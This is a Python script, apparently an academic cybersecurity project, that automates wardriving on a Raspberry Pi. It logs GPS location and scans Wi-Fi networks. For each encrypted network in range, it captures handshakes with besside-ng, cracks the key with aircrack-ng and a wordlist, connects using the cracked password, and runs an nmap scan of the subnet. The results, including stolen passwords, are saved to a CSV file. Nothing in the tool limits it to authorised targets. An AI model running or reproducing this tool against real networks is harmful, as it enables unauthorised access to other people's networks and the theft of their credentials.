#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  SSI_ver.py
#  autors: L&F (Lello Molinario  e Federico Moro)
#  Copyright 2021  <pi@raspberrypi>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the1
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.#  

# The necessary libraries are imported
from gps import *
import time
import subprocess
import wifi
import csv
import sys
import os



# A class for text colours is defined
class c_testo:
    v = '\u001b[92m' #VERDE
    g = '\033[93m' #GIALLO
    r = '\033[91m' #ROSSO
    b = '\033[34m' #BLU
    reset = '\033[0m' #RESET

# A function is defined that creates a logo
def logo ():
    print(c_testo.v + "\t\t  _   _      _                      _")
    print("\t\t  | \\ | |    | |                    | |")
    print("\t\t  |  \\| | ___| |___      _____  _ __| | __")
    print("\t\t  | . ` |/ _ \\ __\\ \\ /\\ / / _ \\| '__| |/ /")
    print("\t\t  | |\\  |  __/ |_ \\ V  V / (_) | |  |   <")
    print("\t\t  |_| \\_|\\___|\\__| \\_/\\_/ \\___/|_|  |_|\\_\\")
    print("\t\t   / ____|                    (_) |")
    print("\t\t  | (___   ___  ___ _   _ _ __ _| |_ _   _")
    print("\t\t   \\___ \\ / _ \\/ __| | | | '__| | __| | | |")
    print("\t\t   ____) |  __/ (__| |_| | |  | | |_| |_| |")
    print("\t\t  |_____/ \\___|\\___|\\__,_|_|  |_|\\__|\\__, |")
    print("\t\t  |  __ \\         (_)         | |     __/ |")
    print("\t\t  | |__) | __ ___  _  ___  ___| |_   |___/")
    print("\t\t  |  ___/ '__/ _ \\| |/ _ \\/ __| __|")
    print("\t\t  | |   | | | (_) | |  __/ (__| |_")
    print("\t\t  |_|   |_|  \\___/| |\\___|\\___|\\__|")
    print("\t\t                 _/ |")
    print("\t\t                |__/                       " + c_testo.reset)

    print(
        c_testo.r + "\nAuthors:\nLello Molinario (matr.70/90/00369)\nFederico Moro (matr.70/90/00380)" + c_testo.reset)
    print(
        "Master's degree in Computer Engineering, Cybersecurity and Artificial Intelligence - University of Cagliari")
    print(c_testo.b + "Supervisor: Prof. Marco Martalò\n" + c_testo.reset)


from gps import *   
def avvio_gps ():
    try:
        # Start the GPS processes and monitors
        subprocess.call(["sudo", "gpsd", "/dev/ttyACM0", "-F", "/var/run/gpsd.sock", "-n"]) 
        print("Starting to read data from the GPS module.\nPlease wait...")
        coordinate=[]
        while len (coordinate)==0:
            # Start data stream
            letture_gps = gps(mode=WATCH_ENABLE|WATCH_NEWSTYLE)
            t_fine = time.time() +  15
            while time.time() < t_fine:
                Latidutine=(letture_gps.fix.latitude)
                Longitudine =(letture_gps.fix.longitude)
                coordinate=[Latidutine,Longitudine]
                prossimo_dati = letture_gps.next()
                    
    
        coord=str(Latidutine)+","+str(Longitudine)
        url=("https://www.google.com/maps/search/?api=1&query="+coord)
        
        print (c_testo.v + "The coordinates detected are:\nLatitude:", Latidutine, "\nLongitude:", Longitudine,  c_testo.reset)
        print ("GPS coordinates can be reached at the URL:",c_testo.v, url,c_testo.reset)

    except Exception as e:
        print(c_testo.r + "The GPS signal is not stable and/or reachable.\nPlease position the antenna better." + c_testo.reset)
        option = input("Do you want to continue without a valid GPS signal?"
                       "\nPress 1 to continue without a valid GPS signal"
                       "\nPress 2 to exit."
                       "\nPlease, enter your selection: ")

        if option == '1':
            Latidutine, Longitudine = 0.0000000, 0.0000000
            url = "https://www.google.com/maps/search/?api=1&query=0.0000000,0.0000000"
        else:
            sys.exit(1)

    return [Latidutine,Longitudine,url]

           
# The function for scanning WIFI is defined and returns the networks present          
def scan_wifi ():
    wifilist = [[]]
    try:
        subprocess.call(["sudo", "systemctl", "start", "NetworkManager"])
    except:
        pass
    while len (wifilist[0])==0 or (wifilist[0])== None:
        wifilist = [[cell.ssid for cell in wifi.Cell.all('wlan0')],
                    [cell.quality for cell in wifi.Cell.all('wlan0')],
                    [cell.encryption_type for cell in wifi.Cell.all('wlan0')],
                    [cell.channel for cell in wifi.Cell.all('wlan0')],
                    [cell.address for cell in wifi.Cell.all('wlan0')],
                    [cell.mode for cell in wifi.Cell.all('wlan0')]]
    print (c_testo.v,"\n\t\t\t\tNumber of networks found:",len (wifilist[0]), c_testo.reset)
    print ("----------------------------------------------------------------------------------------------------------------")
    print ("---------------------------------WIFI NETWORKS AVAILABLE------_---------------------------------------------------")
    print (" SSID\t\t\tQUALITY\tENCRYPTION\tCHANNEL\t\tADDRESS\t\t\tMODE\'")
    for i in range (len(wifilist[0])):
        print(c_testo.r, wifilist[0][i], "\t\t\t"+str(wifilist[1][i]), "\t\t"+str(wifilist[2][i]), "\t\t"+str(wifilist[3][i]), "\t\t"+str(wifilist[4][i]), "\t\t"+str(wifilist[5][i]) ,c_testo.reset)

    return (wifilist)


# A function is defined that receives the found networks, captures the packets and tries to retrieve the password 
def hack_wifi(wifilist):
    
    # AIRMON-NG starts here
    psw=[]
    # try:
    #     subprocess.call(["sudo", "airmon-ng", "check", "kill"])
    #     time.sleep(5)
    #     subprocess.call(["sudo", "airmon-ng", "start", "wlan1"])
    #     print("\nI'm trying to activate monitoring mode  on wlan 1\nPlease wait....\n")
    #     time.sleep(5)
    #
    #
    # except ValueError as e:
    #
    #     print("Error:", e)
    #     print("Network card monitor mode error.\nThe program will be terminated")

    try:
        for i in range (len(wifilist[0])):
            if  i==0:
                if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa") and ((wifilist [3][i]) in range (12)) :
                    print("\nI'm trying to find the Wi-Fi packet capture",(wifilist [0][i])," with encryption", (wifilist [2][i]),"On the chanel",(str(wifilist [3][i])), "\nAttendere prego....\n")
                    try:
                        subprocess.call (["sudo","-s", "besside-ng", "-v","-W","-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                        print("\nI'm trying to find the Wi-Fi packet capture",(wifilist [0][i]),"with encryption", (wifilist [2][i]), "\nPlease wait....\n")
                        time.sleep(5)
                    except:
                        print("Network card monitor mode error.\nThe program will be terminated")
                    
                    wifi_txt=(str(wifilist [0][i])).replace(" ","_")
                    
                    subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" -w ./password.lst ./wpa.cap>"+str(wifi_txt+".txt"),shell=True)
                    with open (((wifi_txt)+".txt"), "r") as aprifile:
                        for x in aprifile:
                            y=x.find("KEY FOUND!")
                            if y>1:
                                a=x.split()
                                print ("\nThe password of the wifi network",wifilist [0][i],"is:", a[3])
                                psw.append (a[3])

                elif ((str(wifilist [2][i])) == "wep") and ((wifilist [3][i]) in range (12)):
                    print("\nI'm trying to find the Wi-Fi packet capture",(wifilist [0][i])," with encryption", (wifilist [2][i]),"On the chanel",(str(wifilist [3][i])), "\nPlease wait....\n")
                    try:
                        subprocess.call (["sudo","-s","besside-ng", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                        print("\nI'm trying to find the wi-fi password",(wifilist [0][i]),"with encryption", (wifilist [2][i]), "\nPlease wait....\n")
                        time.sleep(5)
                    except:
                        print("Network card monitor mode error.\nThe program will be terminated")
                    
                    wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                    
                    subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" ./wep.cap>"+str(wifi_txt1+".txt"),shell=True)
                    with open (((wifi_txt1)+".txt"), "r") as aprifile:
                        for x in aprifile:
                            y=x.find("KEY FOUND!")
                            if y>1:
                                a=x.split()
                        print ("\nThe password of the wifi network",wifilist [0][i],"is:", a[6])
                        psw.append (a[6])
                     

                elif (str(wifilist [2][i])) == "None":
                    wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                    print ("\nFree Wi-Fi:",wifilist [0][i],"!!!\n")
                    psw.append ("")
                
                
                elif ((wifilist [3][i]) > 12):
                    print ("\nThe wifi network",wifilist [0][i], "has a frequency that is out of range.\nSorry but it is not possible to attack it!!!!!!\n")
                    psw.append ("")
                    
                else:
                    print("\nEncryption not yet supported...")
    #                 sys.exit(1)
            else:
                if (((wifilist [0][i])) != ((wifilist [0][i-1])) and ((wifilist [3][i])) != ((wifilist [3][i-1]))):
                    if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa") and ((wifilist [3][i]) in range (12)) :
                        print("\nI'm trying to find the Wi-Fi packet capture",(wifilist [0][i])," with encryption", (wifilist [2][i]),"On the chanel",(str(wifilist [3][i])), "\nAttendere prego....\n")
                        try:
                            subprocess.call (["sudo","-s", "besside-ng", "-v","-W", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                            print("\nI'm trying to find the wi-fi password",(wifilist [0][i]),"with encryption", (wifilist [2][i]), "\nPlease wait....\n")
                            time.sleep(5)
                        except:
                            print("Network card monitor mode error.\nThe program will be terminated")
                        
                        wifi_txt=(str(wifilist [0][i])).replace(" ","_")
                        
                        subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" -w ./password.lst ./wpa.cap>"+str(wifi_txt+".txt"),shell=True)
                        with open (((wifi_txt)+".txt"), "r") as aprifile:
                            for x in aprifile:
                                y=x.find("KEY FOUND!")
                                if y>1:
                                    a=x.split()
                            print ("\nThe password of the wifi network",wifilist [0][i],"is:", a[3])
                            psw.append (a[3])

                    elif ((str(wifilist [2][i])) == "wep") and ((wifilist [3][i]) in range (12)):
                        print("\nI'm trying to find the Wi-Fi packet capture",(wifilist [0][i])," with encryption", (wifilist [2][i]),"On the chanel",(str(wifilist [3][i])), "\nPlease wait....\n")
                        try:
                            subprocess.call (["sudo","-s","besside-ng", "-b",(wifilist [4][i]), "-c",(str(wifilist [3][i])), "wlan1"])
                            print("\nI'm trying to find the wi-fi password",(wifilist [0][i]),"with encryption", (wifilist [2][i]), "\nPlease wait....\n")
                            time.sleep(5)
                        except:
                            print("Network card monitor mode error.\nThe program will be terminated")
                        
                        wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                        
                        subprocess.call("sudo -s aircrack-ng -b "+(wifilist [4][i])+" ./wep.cap>"+str(wifi_txt1+".txt"),shell=True)
                        with open (((wifi_txt1)+".txt"), "r") as aprifile:
                            for x in aprifile:
                                y=x.find("KEY FOUND!")
                                if y>1:
                                    a=x.split()
                                    print ("\nThe password of the wifi network",wifilist [0][i],"is:", a[6])
                                    psw.append (a[6])
                         

                    elif (str(wifilist [2][i])) == "None":
                        wifi_txt1=(str(wifilist [0][i])).replace(" ","_")
                        print ("\nThe wifi network",wifilist [0][i],"is free!!!\n")
                        psw.append ("")
                    
                    
                    elif ((wifilist [3][i]) > 12):
                        print ("\nThe wifi network",wifilist [0][i], " has a frequency that is out of range.\nSorry but it is not possible to attack it!!!\n")
                        psw.append ("")
                        
                    else:
                        print("\nEncryption not yet supported...")
                else:
                    print("Network with the same parameters already scanned")
                    pos=len(psw)-1
                    psw.append(psw[pos])




    except ValueError as e:

        print("Error:", e)

        print()

        print("A network hardware problem has been reported.\nPlease restart the OS.")


    wifilist.append (psw)
    return (wifilist)


#Mi collego alla rete e scansiono le sue vulberabilità
def wifiIP (wifilist):
    ip_completo=[]
    vulnerabilità=[]
    for i in range (len(wifilist[0])):
             
        ip=[]
        
        try:
            if  i==0:
                if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa"or (str(wifilist [2][i])) == "wep" ):
                    print("\nNow that we have obtained the password to the network",(wifilist [0][i]), "let's try to connect....\n")
                    subprocess.call (["sudo","nmcli", "device", "wifi", "connect",(wifilist [0][i]), "password", str(wifilist [6][i])])
                    a=subprocess.run(["hostname","-I"], capture_output= True)
                    uscita=str(a.stdout)
                    punto ="."
                    li_fr= uscita.split(punto)
                    q=list(li_fr[0])
                    g=q[2:]
                    x=(li_fr[3])
                    spazio =" "
                    y=x.split(spazio)
                    nulla =""
                    elem=nulla.join(g)
                    ip.append(elem)
                    ip.append(li_fr[1])
                    ip.append(li_fr[2])
                    ip.append(y[0])
                    ip=punto.join(ip)
                    ip_completo.append (ip)
                    # start scanning nmap
                    ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                    print ("\nNetwork connection", (wifilist [0][i]), "occurred successfully.\nThe IP number assigned by the Access Point is",ip_completo[i])
                    print ("\nStarting vulnerability scanning using \"Nmap Vulscan\"....\nPlease wait...\n")
                    # vulscan scan...very long in case of many connected users
#                   vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
                    # sscan with normal nmap:
                    vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                    vulnerabilità.append (vulner)
                    
                    # Any connections on network cards are terminated
                    try:
                        subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                    except:
                        print("The Wlan0 network card was not used in the process, so it does not need to be deactivated")
#                     try:
#                         subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan1"])
#                     except:
#                         print("The network card wlan1 was not used in the process, so it does not need to be deactivated") 
                    time.sleep (5)
                   
                else:         
                    subprocess.call (["sudo","nmcli",  "device", "wifi", "connect",(wifilist [0][i])])
                    a=subprocess.run(["hostname","-I"], capture_output= True)
                    uscita=str(a.stdout)
                    punto ="."
                    li_fr= uscita.split(punto)
                    q=list(li_fr[0])
                    g=q[2:]
                    x=(li_fr[3])
                    spazio =" "
                    y=x.split(spazio)
                    nulla =""
                    elem=nulla.join(g)
                    ip.append(elem)
                    ip.append(li_fr[1])
                    ip.append(li_fr[2])
                    ip.append(y[0])
                    ip=punto.join(ip)
                    ip_completo.append (ip)
                    #iniziamo la scansione nmap
                    ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                    print ("\nNetwork connection", (wifilist [0][i]), "occurred successfully.\nThe IP number assigned by the Access Point is",ip_completo[i])
                    print ("\nStarting vulnerability scanning using \"Nmap Vulscan\"....\nPlease wait...\n")
                    # vulscan scan...very long in case of many connected users
#                   vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
                    # sscan with normal nmap:
                    vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                    vulnerabilità.append (vulner)
                              
                    # Any connections on network cards are terminated
                    try:
                        subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                    except:
                        print("The Wlan0 network card was not used in the process, so it does not need to be deactivated")
                    
                    time.sleep (5)
            else:
                if (((wifilist [0][i])) != ((wifilist [0][i-1])) and ((wifilist [3][i])) != ((wifilist [3][i-1]))):
                    if ((str(wifilist [2][i])) == "wpa2" or (str(wifilist [2][i])) == "wpa"or (str(wifilist [2][i])) == "wep" ):
                        print("\nNow that we have obtained the password to the network",(wifilist [0][i]), "let's try to connect....\n")
                        subprocess.call (["sudo","nmcli", "device", "wifi", "connect",(wifilist [0][i]), "password", str(wifilist [6][i])])
                        a=subprocess.run(["hostname","-I"], capture_output= True)
                        uscita=str(a.stdout)
                        punto ="."
                        li_fr= uscita.split(punto)
                        q=list(li_fr[0])
                        g=q[2:]
                        x=(li_fr[3])
                        spazio =" "
                        y=x.split(spazio)
                        nulla =""
                        elem=nulla.join(g)
                        ip.append(elem)
                        ip.append(li_fr[1])
                        ip.append(li_fr[2])
                        ip.append(y[0])
                        ip=punto.join(ip)
                        ip_completo.append (ip)
                        # Start of scan with normal nmap:
                        ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                        print ("\nNetwork connection", (wifilist [0][i]), "occurred successfully.\nThe IP number assigned by the Access Point is",ip_completo[i])
                        print ("\nStarting vulnerability scanning using \"Nmap Vulscan\"....\nPlease wait...\n")
                        # vulscan scan...very long in case of many connected users
        #               vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
                        # sscan with normal nmap:
                        vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                        vulnerabilità.append (vulner)
                        
                        # Any connections on network cards are terminated
                        try:
                            subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                        except:
                            print("The Wlan0 network card was not used in the process, so it does not need to be deactivated")
 
                        time.sleep (5)
                       
                    else:         
                        subprocess.call (["sudo","nmcli",  "device", "wifi", "connect",(wifilist [0][i])])
                        a=subprocess.run(["hostname","-I"], capture_output= True)
                        uscita=str(a.stdout)
                        punto ="."
                        li_fr= uscita.split(punto)
                        q=list(li_fr[0])
                        g=q[2:]
                        x=(li_fr[3])
                        spazio =" "
                        y=x.split(spazio)
                        nulla =""
                        elem=nulla.join(g)
                        ip.append(elem)
                        ip.append(li_fr[1])
                        ip.append(li_fr[2])
                        ip.append(y[0])
                        ip=punto.join(ip)
                        ip_completo.append (ip)
                        # Start of scan with normal nmap:
                        ipscan= elem+"."+li_fr[1]+"."+li_fr[2]+".0/24"
                        print ("\nNetwork connection", (wifilist [0][i]), "occurred successfully.\nThe IP number assigned by the Access Point is",ip_completo[i])
                        print ("\nStarting vulnerability scanning using \"Nmap Vulscan\"....\nPlease wait...\n")
                        # vulscan scan...very long in case of many connected users
        #               vulner=subprocess.run(["sudo", "nmap","-v", "--script","vuln",ipscan], capture_output= True)
                        # Scan with normal nmap:
                        vulner=subprocess.run(["sudo", "nmap", "-p", "22",ipscan], capture_output= True)
                        vulnerabilità.append (vulner)
                                  
                        # Any connections on network cards are terminated
                        try:
                            subprocess.call(["sudo", "nmcli", "device", "disconnect", "wlan0"])
                        except:
                            print("The Wlan0 network card was not used in the process, so it does not need to be deactivated")
                        time.sleep (5)
                else:
#                     print("Network",(wifilist [0][i-1])" has the same parameters as the previous one already scanned.\n")
                    pos=len(ip_completo)-1
                    ip_completo.append (ip_completo[pos])
                    vulnerabilità.append (vulnerabilità[pos])


        except Exception as e:
            print(f"The Wi-Fi connection has been lost....\nError: {str(e)}")
            ip_completo.append (None)
            vulnerabilità.append (None)
           

    wifilist.append (ip_completo)
    wifilist.append (vulnerabilità)
        
    return (wifilist)


# Define a function to export the revenue data to an appropriate csv file
def export_csv(coordinate, listawifi):
    url = (coordinate[2])
    latidutine = (coordinate[0])
    longitudine = (coordinate[1])

    conteggio_wifi = len(listawifi[0])

    date = time.strftime("%d/%m/%Y")
    datetime = time.strftime("%H:%M:%S")

    ssid = listawifi[0]
    quality = listawifi[1]
    encryption_type = listawifi[2]
    channel = listawifi[3]
    address = listawifi[4]
    mode = listawifi[5]
    password = listawifi[6]
    ip = listawifi[7]
    vuln = listawifi[8]

    if os.path.isfile("wifi.csv") == False:
        print("There is no \'wifi.cvs\' file to export the data to.")
        print("I'll try to generate it.\n" + c_testo.g + "Please wait..." + c_testo.reset)
        with open('wifi.csv', 'w', newline='') as csvfile:
            fieldnames = ["Date", "Time", 'Latitude', 'Longitude', 'SSID', 'Quality', "Encryption", "Channel",
                          "Address", "Mode", "Password", "Ip", "Vulnerability", "URL"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            i = 0
            while i < conteggio_wifi:
                writer.writerow(
                    {"Date": date, "Time": datetime, 'Latitude': latidutine, 'Longitude': longitudine, 'SSID': ssid[i],
                     'Quality': quality[i],
                     "Encryption": encryption_type[i], "Channel": channel[i],
                     "Address": address[i], "Mode": mode[i], "Password": password[i],
                     "Ip": ip[i], "Vulnerability": vuln[i], "URL": url})
                i = i + 1
        print(c_testo.v + "Data export to \'wifi.cvs\' file was successful")


    else:
        print(
            "There is already a \'wifi.cvs\' file to which to export the data.\nI will append the data." + c_testo.g + "\nPlease wait..." + c_testo.reset)
        with open('wifi.csv', 'a', newline='') as csvfile:
            fieldnames = ["Date", "Time", 'Latitude', 'Longitude', 'SSID', 'Quality', "Encryption", "Channel",
                          "Address", "Mode", "Password", "Ip", "Vulnerability", "URL"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            i = 0
            while i < conteggio_wifi:
                writer.writerow(
                    {"Date": date, "Time": datetime, 'Latitude': latidutine, 'Longitude': longitudine, 'SSID': ssid[i],
                     'Quality': quality[i],
                     "Encryption": encryption_type[i], "Channel": channel[i],
                     "Address": address[i], "Mode": mode[i], "Password": password[i],
                     "Ip": ip[i], "Vulnerability": vuln[i], "URL": url})
                i = i + 1
        print(c_testo.v + "Data export to \'wifi.cvs\' file was successful" + c_testo.reset)
    return (listawifi)


def main():
    #     Start logo
    logo()

    #     Starting gps coordinate search
    coordinate = avvio_gps()

    #     Start wifi scan via less powerful wlan0 (raspberry's network card) to avoid taking other networks except our
    listawifi = scan_wifi()

    #     Hack of wifi via wlan1 (monitor network cards)
    listawifi = hack_wifi(listawifi)

    #     Vulnerabilities scan
    listawifi = wifiIP(listawifi)

    #     Data export
    listawifi = export_csv(coordinate, listawifi)
    print(listawifi)
    return 0


if __name__ == "__main__":
    main()
